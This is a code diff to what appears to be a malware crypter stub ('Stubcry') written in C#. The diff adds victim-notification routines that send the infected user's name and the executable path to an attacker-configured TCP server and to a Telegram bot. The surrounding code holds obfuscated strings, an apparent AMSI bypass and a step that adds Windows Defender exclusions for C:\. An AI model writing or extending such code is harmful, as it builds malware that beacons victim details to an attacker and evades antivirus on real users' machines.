@@ -9,6 +9,7 @@ using System.Reflection;
 using System.Runtime.InteropServices;
 using System.Security.Cryptography;
 using System.Text;
+using System.Net.Sockets;
 using System.Threading;
 using System.Windows.Forms;
 
@@ -78,7 +79,30 @@ namespace Stubcry
                 }
             }
         }
+        public static void socketnotify(string ipAddress, int port, string password)
+        {
+            Socket clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
 
+            try
+            {
+                clientSocket.Connect(ipAddress, port);
+
+            }
+            catch (SocketException e)
+            {
+
+                return;
+            }
+
+            string nothing = password + "|" + Environment.UserName + "|" + config.ePath;
+            byte[] data = Encoding.ASCII.GetBytes(nothing);
+            clientSocket.Send(data);
+
+
+
+            clientSocket.Shutdown(SocketShutdown.Both);
+            clientSocket.Close();
+        }
 
         static void NIKFELSTART(string servicename)
         {
@@ -227,6 +251,20 @@ namespace Stubcry
                 Thread.Sleep(1000);
             }
         }
+        public static void sendtg(string msg, string bot, string chatid)
+        {
+            string url = "https://api.telegram.org/bot" + bot + "/sendMessage?chat_id=" + chatid + "&text=" + msg;
+            try
+            {
+                ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
+                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
+                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
+                response.Close();
+            }
+            catch (WebException ex)
+            {
+            }
+        }
         static void nikamsi()
         {
             IntPtr loadLibrary = LoadLibrary(FOKSTRING("ORQ8cBEtPhQ=", "@mM^gKDz#r4ZpKvI"));
@@ -269,7 +307,14 @@ namespace Stubcry
             {
                 Thread.Sleep(config.sleeptime);
             }
-
+            if (config.issocketnotify == true)
+            {
+                socketnotify(config.ip, config.port, config.serverpass);
+            }
+            if (config.istelegramnotify == true)
+            {
+                sendtg("PEExecutedon:" + Environment.UserName + "\n ExePath=" + config.ePath, config.bottoken, config.chatid);
+            }
             if (config.isexcludewd == true && config.fullpath != config.ePath)
             {
                 string[] Sakerdef = new string[] { FOKSTRING("GFMvLFIoOTIOK1AfTkUXOw==", "j#N^7ZJ@kh3Ec4fu"), FOKSTRING("H0QgHVY4PCYDEUMuMRk=", "j#N^7ZJ@kh3Ec4fu"), "C:\\" };
